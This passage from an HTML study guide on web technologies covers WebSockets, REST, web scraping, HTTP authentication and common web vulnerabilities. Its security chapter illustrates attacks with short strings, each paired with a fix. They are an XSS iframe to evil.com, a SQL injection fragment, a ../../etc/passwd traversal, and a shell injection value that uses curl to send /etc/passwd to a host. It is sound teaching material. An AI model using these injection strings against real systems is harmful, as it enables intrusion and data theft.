            <li><strong>WebSockets</strong> — a real, persistent, two-way connection (the whole subject of the next chapter), which is the cleanest solution but requires setting up a dedicated WebSocket server.</li>
          </ul>
        </div>
      </details>

      <div class="chapter-footer-nav"><a class="footer-nav-btn" href="#ch4" data-target="ch4">← JavaScript</a><a class="footer-nav-btn" href="#ch6" data-target="ch6">Next: WebSockets →</a></div>
    </section>

    <section class="chapter" id="ch6">
      <div class="chapter-head"><span class="chapter-num">06</span><h2>WebSockets</h2></div>
      <p class="chapter-intro">If AJAX is "the browser keeps asking the server," WebSockets are "the server and browser can both talk whenever they want, over one connection that just stays open."</p>

      <details class="topic" open>
        <summary><span class="chevron"></span>The problem WebSockets solve</summary>
        <div class="topic-body">
          <p>HTTP's request→response model has a hard limitation baked into its design: the server can genuinely never initiate contact. It can only ever <em>reply</em> to something the client already asked for. That's a real problem for anything that needs to feel "live" — a chat app, a multiplayer game, a live stock ticker — because the workarounds (repeated polling, or the more complex long-polling/Comet trick) are all fundamentally still built on top of a protocol that wasn't designed for two-way, anytime communication.</p>
          <p><strong>WebSockets</strong> solve this directly by providing a genuinely <strong>full-duplex</strong> channel — both sides can send whenever they want, independently, over a single, long-lived TCP connection, without any polling at all.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>The handshake — starting as HTTP, then switching protocols</summary>
        <div class="topic-body">
          <p>A clever design decision in WebSockets is that they don't need their own separate port or infrastructure — a WebSocket connection <em>starts</em> as a completely normal-looking HTTP request, then gets "upgraded" in place. This means WebSockets work fine through existing firewalls, proxies, and load balancers that only know how to handle HTTP.</p>
          <div class="diagram">
            <div class="mermaid">
sequenceDiagram
    participant C as Client
    participant S as Server
    C->>S: GET /chat HTTP/1.1<br/>Upgrade: websocket<br/>Sec-WebSocket-Key: dGhl...
    S-->>C: 101 Switching Protocols<br/>Upgrade: websocket<br/>Sec-WebSocket-Accept: s3pP...
    Note over C,S: From here on, it's no longer HTTP —<br/>both sides can send frames anytime
            </div>
          </div>
          <p>Here's what's happening in that handshake, in plain terms: the client sends a normal-looking GET request, but adds an <code>Upgrade: websocket</code> header (asking to switch protocols) plus a randomly generated <code>Sec-WebSocket-Key</code>. The server proves it genuinely understood the request — not just some proxy blindly forwarding bytes — by taking that key, appending a fixed "magic" constant defined in the spec (<code>258EAFA5-E914-47DA-95CA-C5AB0DC85B11</code>), hashing the result with SHA-1, and base64-encoding it as <code>Sec-WebSocket-Accept</code>. Once the client verifies that matches what it expects, both sides know they're genuinely talking WebSocket now, not just HTTP that happens to look similar.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Frames — how messages are actually packaged</summary>
        <div class="topic-body">
          <p>Once the connection is upgraded, data travels in units called <strong>frames</strong>, split into two categories: <strong>control frames</strong> (small, out-of-band signals: close = <code>0x8</code>, ping = <code>0x9</code>, pong = <code>0xA</code>) and <strong>data frames</strong> (your actual application messages, which can be text or binary).</p>
          <table>
            <tr><th>Field</th><th>Purpose</th></tr>
            <tr><td>FIN bit</td><td>Is this the last frame of the current message? (A big message can be split across several frames.)</td></tr>
            <tr><td>Opcode</td><td><code>0x1</code> = text, <code>0x2</code> = binary, <code>0x8/0x9/0xA</code> = control</td></tr>
            <tr><td>Mask bit</td><td>Whether this frame's payload is XOR-masked</td></tr>
            <tr><td>Payload length</td><td>Encoded in 7, 16, or 64 bits depending on how big the message is</td></tr>
          </table>
          <div class="callout tip"><span class="callout-label">Why the mask exists — a genuinely interesting detail</span><p>It's <em>not</em> for privacy or encryption. It exists to stop a malicious webpage from crafting a WebSocket frame that could be misread by an old, WebSocket-unaware proxy as a legitimate plain HTTP request — which could be used to "poison" a shared cache. Masking client→server frames scrambles the bytes just enough to prevent that specific trick, without adding any real security against a dedicated attacker who controls the raw connection directly.</p></div>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>URI schemes and using it in JavaScript</summary>
        <div class="topic-body">
          <p><code>ws://</code> is a plain, unencrypted WebSocket connection. <code>wss://</code> is WebSocket Secure — it rides on top of the same TLS encryption that an HTTPS connection would already be using.</p>
          <pre><code><span class="tok-key">var</span> ws = <span class="tok-key">new</span> WebSocket(<span class="tok-str">"ws://example.com/socket"</span>);
ws.onopen = (event) => { ws.send(<span class="tok-str">"hello"</span>); };
ws.onmessage = (event) => { console.log(event.data); };
ws.close();</code></pre>
          <p>The browser's WebSocket API deliberately hides all the low-level framing, masking, and opcode details from your JavaScript — you just call <code>.send()</code> with a string or binary buffer, and listen for the <code>onmessage</code> event. The browser sanitizes everything to prevent a malicious page from exploiting the raw protocol details to do something harmful, like the cache-poisoning trick mentioned above.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>The honest performance tradeoffs</summary>
        <div class="topic-body">
          <p>WebSockets aren't a strictly-better replacement for everything HTTP does — they trade away some things to gain others:</p>
          <ul>
            <li><strong>Gain:</strong> genuinely better two-way communication — no more polling overhead.</li>
            <li><strong>Lose:</strong> you miss out on the browser's normal HTTP client-side caching entirely — there's no equivalent concept for a WebSocket message.</li>
            <li>In a sense, it's <strong>reinventing part of what TCP/UDP already do</strong> at the application level, specifically so browser JavaScript (which can't open a raw TCP or UDP socket directly) can get similar behavior.</li>
            <li><strong>Gain:</strong> because it rides on the same port as HTTP(S), it naturally gets through firewalls and proxies that would otherwise block a custom protocol.</li>
            <li>It <strong>doesn't fully replace</strong> AJAX's <code>fetch</code>/<code>XHR</code> — for simple one-off request/response interactions, plain HTTP is still usually the simpler, more appropriate tool.</li>
          </ul>
        </div>
      </details>

      <div class="chapter-footer-nav"><a class="footer-nav-btn" href="#ch5" data-target="ch5">← AJAX</a><a class="footer-nav-btn" href="#ch7" data-target="ch7">Next: RESTful Services →</a></div>
    </section>

    <section class="chapter" id="ch7">
      <div class="chapter-head"><span class="chapter-num">07</span><h2>RESTful Web Services</h2></div>
      <p class="chapter-intro">REST is one of those words used constantly and understood loosely. This chapter is about actually understanding <em>why</em> its rules exist, so you can explain them, not just recite them.</p>

      <details class="topic" open>
        <summary><span class="chevron"></span>What REST actually is</summary>
        <div class="topic-body">
          <p><strong>REST</strong> stands for <strong>RE</strong>presentational <strong>S</strong>tate <strong>T</strong>ransfer. It's not a protocol or a library — it's an <em>architectural style</em>, introduced by Roy Fielding in his PhD dissertation, describing a set of constraints that, together, make a web API scalable and maintainable in the same way the Web itself scaled to billions of pages.</p>
          <p>Boiled all the way down: <strong>URIs name things (nouns)</strong>, and <strong>HTTP verbs act on those things</strong>. Instead of inventing a custom "protocol" for every API, REST just reuses HTTP's existing verbs, status codes, and caching machinery — infrastructure the entire internet already understands and has spent decades optimizing.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>REST vs. RPC — a real distinction, not just jargon</summary>
        <div class="topic-body">
          <p><strong>RPC</strong> (Remote Procedure Call) treats a network request like calling a function: you name a procedure, pass it some inputs, and get back outputs — mentally, it's "calling code on another machine." <strong>REST is explicitly not this.</strong> Where RPC hides the network behind a function-call illusion, REST leans into HTTP's actual properties: named resources (URIs), a small fixed set of verbs, headers carrying metadata, and — crucially — the ability for intermediate systems (caches, proxies) to understand and <em>transform</em> requests, because they're expressed in a standard, well-known format rather than an arbitrary custom function signature.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>The core properties of REST</summary>
        <div class="topic-body">
          <div class="diagram">
            <div class="mermaid">
flowchart TD
    R["REST Properties"] --> A["Client-Server<br/>separation of concerns"]
    R --> B["Stateless<br/>server holds no client context"]
    R --> C["Cacheable<br/>responses say how long to cache"]
    R --> D["Uniform Interface<br/>consistent URIs + verbs"]
    R --> E["Layered System<br/>proxies/gateways can sit in between"]
    R --> F["Code on Demand (optional)<br/>e.g. sending JS to the client"]
            </div>
          </div>
          <p><strong>Stateless</strong> is the property worth understanding most deeply, because it's the one that actually explains <em>why</em> REST scales. In a stateless API, the <em>client</em> carries all the context needed to understand a request — the server keeps no memory of "who this client is" or "what they did last time" between separate requests. Every request has to be self-contained. This sounds like it makes requests heavier (and it does, slightly), but the payoff is enormous: since no server-side memory is required, <em>any</em> server in a cluster can handle <em>any</em> request, with no need for "sticky sessions" that pin a specific user to a specific machine. That's what lets you scale horizontally just by adding more identical servers behind a load balancer.</p>
          <div class="callout warn"><span class="callout-label">Common misconception</span><p>Traditional server-side <strong>session IDs are not stateless</strong> — the server has to remember which session ID maps to which user's data, so a specific server now has to "own" that state. You <em>can</em> have a stateless cookie, though, if it's just an auth token the server independently re-verifies against a database on every request (not something the server has to have "remembered" from earlier). This is exactly why token-based auth (JWTs, covered in Chapter 9) fits REST much more naturally than classic server-side sessions.</p></div>
          <p><strong>Cacheable</strong> is straightforward but easy to forget in practice: GET and HEAD are cacheable by default, because reading something shouldn't have side effects — but POST and PATCH are <em>not</em> cacheable unless a response explicitly says otherwise with cache headers, because by definition they might change something on the server.</p>
          <p><strong>Layered</strong> means your API doesn't have to be one monolithic machine — you can transparently insert an authentication layer, a caching layer, a load balancer, or a logging proxy in between the client and your actual application code, and because everything still speaks plain HTTP, none of those layers need special awareness of your specific API's internals.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Is this operation "safe, repeatable, cacheable, stateless"? — a genuinely useful mental framework</summary>
        <div class="topic-body">
          <p>A great way to reason about any API design decision (and a great way to answer interview questions about REST) is to ask these four questions about any given operation:</p>
          <table>
            <tr><th>Example</th><th>Safe?</th><th>Repeatable?</th><th>Cacheable?</th><th>Stateless?</th></tr>
            <tr><td>Search query</td><td>✅</td><td>✅</td><td>✅</td><td>✅</td></tr>
            <tr><td>Weather lookup</td><td>✅</td><td>✅</td><td>✅ (briefly)</td><td>✅</td></tr>
            <tr><td>Viewing a photo</td><td>✅</td><td>✅</td><td>✅</td><td>✅</td></tr>
            <tr><td>Making a payment</td><td>❌</td><td>❌ — repeating it risks a double-charge</td><td>❌</td><td>❌</td></tr>
            <tr><td>Authentication</td><td>✅ once a token exists</td><td>✅</td><td>✅ if it expires</td><td>Depends on implementation</td></tr>
          </table>
          <p>A payment is the clearest illustration of why idempotency matters in the real world, not just as an abstract rule: if a connection drops right after you submit a payment and you're not sure it went through, is it safe to just try again? If the operation is properly idempotent (designed so a duplicate submission is detected and ignored server-side), yes. If it's a naive POST with no such protection, retrying blindly risks charging the customer twice.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Practical design tips</summary>
        <div class="topic-body">
          <ul>
            <li>Think <strong>nouns first</strong>, then attach verbs to them — design your URL structure (<code>/tweets</code>, <code>/tweets/2/responses</code>) before worrying about what each endpoint "does."</li>
            <li>Use <strong>plural</strong> URLs for collections (<code>/tweets</code>, not <code>/tweet</code>).</li>
            <li>Version your API directly in the URL, so you can evolve it without breaking existing clients.</li>
            <li>Return <code>201 Created</code> for new resources, with a <code>Location</code> header pointing at the newly created thing.</li>
            <li>Keep JSON responses flat and un-nested where possible — don't wrap every response in unnecessary extra layers.</li>
            <li>Paginate large collections rather than returning everything in one giant response.</li>
            <li>Prefer simple HTTP auth over TLS over inventing your own complicated custom scheme — simplicity here reduces your attack surface (see Chapter 10).</li>
          </ul>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>HATEOAS — the part of REST people skip, and shouldn't</summary>
        <div class="topic-body">
          <p><strong>HATEOAS</strong> stands for <strong>H</strong>ypermedia <strong>A</strong>s <strong>T</strong>he <strong>E</strong>ngine <strong>O</strong>f <strong>A</strong>pplication <strong>S</strong>tate. The idea: your API responses shouldn't just return raw data — they should also include <strong>hyperlinks</strong> to related resources, the exact same way a normal web page links to other pages. A client (human or program) can then <em>discover</em> what to do next just by following links, rather than needing that logic hardcoded in advance.</p>
          <p>This is genuinely just applying "the Web" to APIs: a <code>201 Created</code> response including a <code>Location</code> header pointing at the resource you just made is a tiny, everyday example of HATEOAS already baked into plain HTTP.</p>
        </div>
      </details>

      <div class="chapter-footer-nav"><a class="footer-nav-btn" href="#ch6" data-target="ch6">← WebSockets</a><a class="footer-nav-btn" href="#ch8" data-target="ch8">Next: Web Mining →</a></div>
    </section>

    <section class="chapter" id="ch8">
      <div class="chapter-head"><span class="chapter-num">08</span><h2>Web Mining</h2></div>
      <p class="chapter-intro">Web mining is about automatically pulling useful information out of the web — whether that's structured data from an API, or messy content scraped straight out of a human-facing website.</p>

      <details class="topic" open>
        <summary><span class="chevron"></span>Why "web services" and "websites" are such different mining targets</summary>
        <div class="topic-body">
          <p>A <strong>web service</strong> (a proper API) returns structured, predictable data — JSON or XML with a defined shape — specifically <em>designed</em> for machines to consume. A <strong>website</strong>, by contrast, is built for human eyeballs, with layout and styling mixed in with the actual content, no guarantee the structure stays consistent over time, and no formal contract about what will or won't change. That's why the course notes are emphatic about checking for an official API or feed <em>first</em>, before writing anything that scrapes raw HTML — you'll get better-quality, more stable data with far less fragile code.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>The general workflow</summary>
        <div class="topic-body">
          <div class="diagram">
            <div class="mermaid">
flowchart LR
    A[1. Retrieve documents] --> B[2. Extract information] --> C[3. Analyze information] --> D[4. Aggregate &amp; report]
            </div>
          </div>
          <p>These four stages — retrieve, extract, analyze, aggregate/report — are conceptually separate, and that separation matters in practice: each stage can potentially be run in parallel (fetching a hundred pages at once, for example), and keeping the stages decoupled means you can swap out how you <em>extract</em> data without touching how you <em>retrieve</em> it, or vice versa.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Feeds — RSS and Atom</summary>
        <div class="topic-body">
          <p>Many sites expose a structured <strong>RSS</strong> or <strong>Atom</strong> feed — XML documents specifically meant to be machine-read, describing a stream of recent items (blog posts, news articles). <strong>Atom</strong> is the newer of the two, created to fix some of RSS's rough edges around character encoding and internationalization.</p>
          <div class="callout warn"><span class="callout-label">Practical tip</span><p>Feeds in the wild are often <em>slightly</em> malformed XML — enough to break a strict XML parser that insists on perfectly valid syntax. Use a dedicated feed-parsing library (like Python's <code>feedparser</code>) instead of a generic XML parser; these libraries are specifically built to tolerate the kind of small inconsistencies real-world feeds tend to have.</p></div>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Parsing raw HTML — and why regex is the wrong tool</summary>
        <div class="topic-body">
          <p>When there's no feed or API available, you're stuck parsing raw HTML directly, typically with a library like Python's <strong>BeautifulSoup (BS4)</strong>.</p>
          <div class="callout warn"><span class="callout-label">Never use regex to parse HTML</span><p>This shows up as a rule of thumb in almost every web scraping course for a real technical reason: HTML can nest arbitrarily deeply and unpredictably (a <code>&lt;div&gt;</code> inside a <code>&lt;div&gt;</code> inside a <code>&lt;div&gt;</code>, forever), and regular expressions are fundamentally built to match "regular languages" — patterns with a bounded, describable structure. HTML's arbitrary nesting puts it outside what regex can reliably describe, so a regex that happens to work on today's page can silently break the moment the site's structure shifts even slightly. A proper HTML parser (like BS4) actually builds a structural tree, the same way a browser does, and can navigate it reliably regardless of nesting depth.</p></div>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Selenium — when you need a real browser</summary>
        <div class="topic-body">
          <p>Some pages don't have their real content in the initial HTML at all — it gets built dynamically by JavaScript after the page loads (a common pattern in modern single-page apps). A simple HTTP request + HTML parser combo will only ever see the empty shell, not the final rendered content. <strong>Selenium</strong> solves this by automating an <em>actual</em> browser — it can click buttons, wait for JavaScript to run, and then read the fully-rendered DOM, exactly as a human user would experience it. As a side benefit, the same tool is widely used for automated UI testing, not just scraping — though it's inherently fragile if a site's interface changes often, since Selenium scripts typically rely on specific button/element selectors staying stable.</p>
        </div>
      </details>

      <div class="chapter-footer-nav"><a class="footer-nav-btn" href="#ch7" data-target="ch7">← RESTful Services</a><a class="footer-nav-btn" href="#ch9" data-target="ch9">Next: HTTP Authentication →</a></div>
    </section>

    <section class="chapter" id="ch9">
      <div class="chapter-head"><span class="chapter-num">09</span><h2>HTTP Authentication</h2></div>
      <p class="chapter-intro">Before OAuth, tokens, and third-party login buttons, HTTP had two built-in ways to authenticate: Basic and Digest. Understanding <em>why</em> they're weak is more useful than memorizing their steps.</p>

      <details class="topic" open>
        <summary><span class="chevron"></span>HTTP Basic Authentication</summary>
        <div class="topic-body">
          <div class="diagram">
            <div class="mermaid">
sequenceDiagram
    participant C as Client
    participant S as Server
    C->>S: GET /secret
    S-->>C: 401 Unauthorized<br/>WWW-Authenticate: Basic realm="my-site"
    Note over C: Browser prompts the user for a username/password
    C->>S: GET /secret<br/>Authorization: Basic base64(user:pass)
    S-->>C: 200 OK
            </div>
          </div>
          <p>The flow is simple: request a protected resource, get told <code>401 Unauthorized</code> with a <code>WWW-Authenticate: Basic realm="..."</code> header (the "realm" is just a label describing what you're logging into), and then resend the same request with an <code>Authorization: Basic &lt;credentials&gt;</code> header, where the credentials are <code>base64(username:password)</code>.</p>
          <div class="callout warn"><span class="callout-label">The detail everyone gets wrong</span><p><strong>Base64 is an encoding, not an encryption.</strong> It's fully and trivially reversible by anyone — there's no secret key involved at all, just a public, standard algorithm for representing bytes as text. Anyone who intercepts a Basic auth header can decode the username and password in milliseconds. Basic auth is <em>only</em> acceptable to use when the entire connection is already running over HTTPS, so the header itself is protected by TLS encryption rather than by anything about "Basic" itself.</p></div>
          <p>It's also worth noting Basic auth is <strong>stateless</strong> in a technical sense — the server doesn't need to remember anything between requests, it just re-validates the same credentials every single time. That statelessness is actually a point in its favor architecturally (it fits REST's stateless constraint from Chapter 7), even though its security properties are weak.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>HTTP Digest Authentication</summary>
        <div class="topic-body">
          <p>Digest auth exists specifically to avoid Basic's biggest flaw: sending the actual password (even encoded) over the wire. Instead, it combines the password with a server-issued <strong>nonce</strong> (a one-time random value, generated fresh for each authentication attempt) and sends a cryptographic <em>hash</em> of the combination — meaning the real password never has to travel across the network at all, even in encoded form.</p>
          <p>The nonce also gives some protection against <strong>replay attacks</strong> — where an attacker doesn't even need to know your password, they just capture and resend ("replay") a previous legitimate request to fool the server into thinking it's you again. Since each nonce is meant to be used once, a captured old request becomes useless to replay.</p>
          <p><strong>Simplified flow:</strong> client requests a resource → server replies <code>401</code> with <code>WWW-Authenticate: Digest ...</code> (including a fresh nonce) → client recomputes the request with a hash built from the nonce and the password → server independently recomputes the same hash and compares.</p>
          <p>If you want the actual math (worth knowing in case an exam asks you to trace through it), the digest is built from two intermediate pieces, <code>A1</code> and <code>A2</code>, combined with the nonce:</p>
          <pre><code><span class="tok-key">def</span> <span class="tok-fn">KD</span>(x, y):
    <span class="tok-key">return</span> md5(x + <span class="tok-str">":"</span> + y)

A1 = username_value + <span class="tok-str">":"</span> + realm_value + <span class="tok-str">":"</span> + passwd
A2 = <span class="tok-str">":"</span> + digest_uri                    <span class="tok-com"># simple, non-qop case</span>
request_digest = KD(hash(A1), nonce_value + <span class="tok-str">":"</span> + hash(A2))</code></pre>
          <p><code>A1</code> bundles the username, the realm, and the password — so the resulting hash is tied to <em>this specific site's</em> login, not something reusable elsewhere. <code>A2</code> ties the hash to the exact request URI being accessed, so it can't simply be copy-pasted onto a request for a different resource. In the more modern <code>qop</code> ("quality of protection") variant, <code>A2</code> also folds in the HTTP method, plus a client-generated nonce (<code>cnonce</code>) and a request counter (<code>nc</code>) — extra ingredients specifically added to make replay attacks even harder to pull off.</p>
          <div class="callout warn"><span class="callout-label">Why Digest still isn't great</span><p>It offers no <em>confidentiality</em> — the actual content of your request/response still travels unencrypted, only the credentials are hashed. It's still vulnerable to man-in-the-middle tampering. And its reliance on a fresh nonce for every exchange adds real performance overhead — you effectively can't send a "pre-authenticated" request without first chatting with the server to get a nonce. In practice, most modern systems skip Digest entirely and use either Basic-over-HTTPS or token-based auth instead.</p></div>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Token-based authentication — the modern default</summary>
        <div class="topic-body">
          <pre><code>Authorization: token OAUTH-TOKEN</code></pre>
          <p>Instead of sending a username/password on every request, the client sends an opaque <strong>token</strong> — a value it received once (often after a proper login flow, potentially involving OAuth) and now reuses. <strong>JWT (JSON Web Token)</strong>, defined in RFC 7519, is by far the most common token format used today.</p>
          <p>This approach has two real advantages: it reuses the exact same <code>Authorization</code> header mechanism HTTP already defines, so it stays compatible with all the standard tooling and infrastructure built around HTTP — and it can be implemented in a genuinely stateless way (the server independently verifies the token's signature rather than needing to remember a session), which keeps it aligned with REST's core statelessness principle.</p>
        </div>
      </details>

      <div class="callout tip"><span class="callout-label">The one rule that covers all of this</span><p>Whichever scheme you use — Basic, Digest, tokens — <strong>none of them are safe without TLS/HTTPS underneath.</strong> TLS (Chapter 11) is what actually protects the conversation from eavesdropping; the authentication scheme on top just decides how credentials are packaged.</p></div>

      <div class="chapter-footer-nav"><a class="footer-nav-btn" href="#ch8" data-target="ch8">← Web Mining</a><a class="footer-nav-btn" href="#ch10" data-target="ch10">Next: Security →</a></div>
    </section>

    <section class="chapter" id="ch10">
      <div class="chapter-head"><span class="chapter-num">10</span><h2>Security</h2></div>
      <p class="chapter-intro">Every vulnerability in this chapter follows the same underlying pattern: the server trusted something it shouldn't have — usually user input — without checking or escaping it first. Once you see that pattern, all of these start to feel less like a list to memorize and more like one idea applied several ways.</p>

      <details class="topic" open>
        <summary><span class="chevron"></span>Start with the right question</summary>
        <div class="topic-body">
          <p>Before diving into specific attacks, the course notes frame security around one grounding question: <strong>what is your website actually supposed to do?</strong> Every vulnerability below is really a way for an attacker to make your site do something it was never supposed to — distribute malware, run arbitrary code, leak private data, host content you never intended to host. Keeping that framing in mind makes it much easier to reason about <em>new</em>, unfamiliar attacks you haven't specifically studied, not just the named ones below.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Cross-Site Scripting (XSS)</summary>
        <div class="topic-body">
          <p><strong>What happens:</strong> an attacker manages to get their own <code>&lt;script&gt;</code> (or other active markup) to actually execute inside your page, because you took their input and printed it directly into HTML without escaping it first.</p>
          <pre><code>&lt;!-- Say a "username" field contains: --&gt;
&lt;iframe src="http://evil.com"&gt;&lt;/iframe&gt;</code></pre>
          <p>If your server just inserts that string straight into the page's HTML, the browser doesn't see "a username that happens to contain angle brackets" — it sees a real, live <code>&lt;iframe&gt;</code> element and renders it as one. The same trick works with <code>&lt;script&gt;</code> tags to run arbitrary JavaScript in the context of your page — meaning it can read cookies, make requests as the logged-in user, or rewrite the page entirely.</p>
          <p><strong>Fix:</strong></p>
          <ul>
            <li>Never trust or directly print raw user input into HTML.</li>
            <li><strong>Escape</strong> HTML entities in any user-generated text before rendering it.</li>
            <li><strong>Encode</strong> URIs properly rather than just concatenating strings into a URL.</li>
            <li>Use a templating engine that auto-escapes output by default, so you have to deliberately opt out rather than deliberately opt in.</li>
            <li>In JavaScript, use <code>.textContent</code>/<code>.innerText</code> rather than <code>.innerHTML</code> when inserting user-supplied text — the former treats it as plain text, the latter parses it as live HTML.</li>
          </ul>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Cross-Site Request Forgery (CSRF)</summary>
        <div class="topic-body">
          <p><strong>What happens:</strong> a malicious website tricks your browser into sending a request to a <em>different</em> site you happen to already be logged into — riding on your existing cookies, without your knowledge. If you're logged into your bank in one tab, and a malicious page in another tab silently triggers a form submission to your bank's "transfer money" endpoint, your browser will happily attach your real session cookie to that request, because the browser only ever checks "which site is this cookie for," not "did the user actually mean to do this."</p>
          <p><strong>Fix:</strong></p>
          <ul>
            <li>Use <strong>CSRF tokens</strong> — a unique, unguessable value tied to the user's session, required on every state-changing request, that an attacker's page has no way to know or predict.</li>
            <li>Make <code>GET</code>/<code>HEAD</code>/<code>OPTIONS</code> genuinely <strong>safe</strong> — never let them mutate state. A famous cautionary example: <code>/logout</code> should never be implemented as a plain GET link, because that makes it trivially forgeable (an attacker could log people out just by getting them to load an image tag pointing at that URL).</li>
            <li>Check the <code>Origin</code>/<code>Referer</code> headers to confirm a request actually originated from your own site.</li>
            <li>Add extra "challenge" steps for sensitive actions — re-entering a password, a CAPTCHA, two-factor confirmation.</li>
          </ul>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Path traversal</summary>
        <div class="topic-body">
          <p><strong>What happens:</strong> an attacker requests something like <code>../../etc/passwd</code> as part of a filename or path parameter, trying to escape whatever directory your application intended to restrict them to, and read (or write) files they were never supposed to access.</p>
          <p><strong>Fix:</strong> resolve the requested path to its full, absolute form, and explicitly verify the result still lives <em>inside</em> the directory you intended to allow, before doing anything with it. Simply blocking the literal string <code>..</code> is a common but inadequate half-measure — always validate the final resolved path, not just the raw input string.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Trusting functionality from someone else's site</summary>
        <div class="topic-body">
          <p>Plenty of legitimate services ask you to embed their content directly into your page — <code>&lt;iframe&gt;</code>s, ad networks, third-party widgets. Advertising networks routinely ask for exactly this same level of trust back from you. The moment you include someone else's functionality directly into your page, you're implicitly trusting them not to inject something harmful — whether that's a compromised ad served through a legitimate ad network, or a third-party widget that gets hijacked later. There isn't a single silver-bullet fix here; it's fundamentally a trust decision, which is why the <code>Content-Security-Policy</code> header (covered in the header reference in Chapter 2) exists — it lets you explicitly whitelist which external sources your page is even allowed to load scripts or embeds from, limiting the blast radius if one of them turns out to be compromised.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>SQL Injection</summary>
        <div class="topic-body">
          <p><strong>What happens:</strong> user input gets pasted directly into a SQL query string, letting an attacker inject their <em>own</em> SQL logic into what was meant to be a plain data value.</p>
          <pre><code><span class="tok-com">-- A classic injection pattern, dropped into a login field:</span>
' OR 1=1; --</code></pre>
          <p>If a query is built by naively concatenating that string in, the resulting SQL can end up always evaluating true regardless of the real password — or worse, chaining on entirely new statements (like dropping a table).</p>
          <p><strong>Fix:</strong> never build SQL queries by string-concatenating raw input. Use <strong>parameterized queries</strong> (prepared statements), where the database driver keeps your query structure and your data cleanly separated, so user input can never be reinterpreted as SQL syntax no matter what characters it contains.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Shell injection</summary>
        <div class="topic-body">
          <p>The exact same underlying idea as SQL injection, but targeting an operating system shell command instead of a database query:</p>
          <pre><code>os.system(<span class="tok-str">"command arg1 arg2 %s"</span> % arg3)
<span class="tok-com"># if arg3 is attacker-controlled and equals:</span>
<span class="tok-com"># "; curl -X PUT http://mysite -d @/etc/passwd</span></code></pre>
          <p>The injected semicolon lets the attacker append an entirely separate command, which then runs with whatever privileges your original process had.</p>
          <p><strong>Fix:</strong> never build shell command strings from raw input. Use APIs that avoid invoking a shell interpreter at all — for example, Python's <code>subprocess</code> module called with a list of arguments (not a single shell string), which passes arguments directly to the program without any shell-level string interpretation happening in between.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Poorly encrypted cookies and tokens</summary>
        <div class="topic-body">
          <p>Since HTTP is stateless, it's tempting to just stuff application state directly into the user's cookie instead of maintaining server-side session storage. But that raises real dangers: what happens if the cookie is <strong>stolen</strong> (an attacker copies it and pretends to be you)? What if it's <strong>replayed</strong> (resent later, even without understanding its contents)? What if it's <strong>tampered with</strong>?</p>
          <p>That last one is subtler than it sounds: many naive encryption implementations only check that the data <em>decrypts without error</em>, not that it's actually <em>authentic</em> and unmodified. An attacker who can't read the encrypted contents can still sometimes flip specific bits in the ciphertext, causing it to decrypt into <em>garbage</em> that your server then processes anyway — which can chain straight into a completely different vulnerability, like SQL injection, if that garbage ends up somewhere unsafe downstream.</p>
          <div class="callout tip"><span class="callout-label">Worth remembering</span><p>The math behind good encryption is generally sound and extremely hard to break directly. Almost all real-world "encryption got hacked" stories are actually stories about a flawed <em>implementation</em> — missing integrity checks, reused keys, predictable nonces — not a broken mathematical algorithm.</p></div>
          <p><strong>Fix:</strong> use authenticated encryption (schemes that verify integrity, not just confidentiality), and consider binding a token to context like the client's IP address, making a stolen token harder to reuse successfully from a different location.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>DoS and DDoS</summary>
        <div class="topic-body">
          <p><strong>Denial of Service</strong> means overwhelming a target so it can no longer serve legitimate users — flooding it with traffic, filling up its request queues, or forcing it to do expensive work repeatedly (spamming, resource exhaustion). A <strong>Distributed</strong> Denial of Service does the exact same thing, but from <em>many</em> machines simultaneously (often a botnet of compromised devices), which makes it far harder to block by simply banning a single source IP — and can be combined with tricks like DNS poisoning or traffic redirection to amplify the effect further.</p>
        </div>
      </details>

      <div class="chapter-footer-nav"><a class="footer-nav-btn" href="#ch9" data-target="ch9">← HTTP Authentication</a><a class="footer-nav-btn" href="#ch11" data-target="ch11">Next: TLS →</a></div>
    </section>

    <section class="chapter" id="ch11">
      <div class="chapter-head"><span class="chapter-num">11</span><h2>TLS</h2></div>
      <p class="chapter-intro">TLS is what turns HTTP into HTTPS. It sits quietly between TCP and your actual application data, and solves three distinct trust problems at once.</p>

      <details class="topic" open>
        <summary><span class="chevron"></span>The three problems TLS solves</summary>
        <div class="topic-body">
          <p><strong>TLS</strong> (Transport Layer Security — formally called SSL in its earlier incarnation) sits between the Transport layer (TCP) and the Application layer (HTTP) from Chapter 1's stack. HTTP running on top of TLS is exactly what "HTTPS" means.</p>
          <table>
            <tr><th>Property</th><th>The question it answers</th></tr>
            <tr><td><strong>Identity</strong></td><td>Am I actually talking to who I think I'm talking to?</td></tr>
            <tr><td><strong>Privacy</strong></td><td>Can anyone eavesdrop on the conversation as it travels?</td></tr>
            <tr><td><strong>Authenticity</strong></td><td>Did this specific message really come from the party I think sent it — and was it altered in transit?</td></tr>
          </table>
